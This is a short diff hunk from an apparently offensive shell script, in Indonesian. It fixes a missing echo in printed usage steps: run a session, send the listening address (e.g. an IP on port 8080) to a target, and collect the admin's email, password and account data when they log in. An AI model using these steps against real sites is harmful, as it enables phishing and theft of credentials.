@@ -423,7 +423,7 @@ echo " Setelah Copy No Address,, Buka Session Pertama Tadi,, Lalu Tulis "
 echo " $ run "
 echo " Copas No Address Tadi Ke Target "
 echo " Contoh : 125.25.175.88:8080 "
-NOTE : Ingat Harus Di Kasih Port > :8080 "
+echo " NOTE : Ingat Harus Di Kasih Port > :8080 "
 echo " Jika Sudah Dibuka Si Admin Saat Dia Login Nanti Email Dan Password Tertera Serta Data2 Akun Target "
 
 echo $green" BERHASIL_COK "
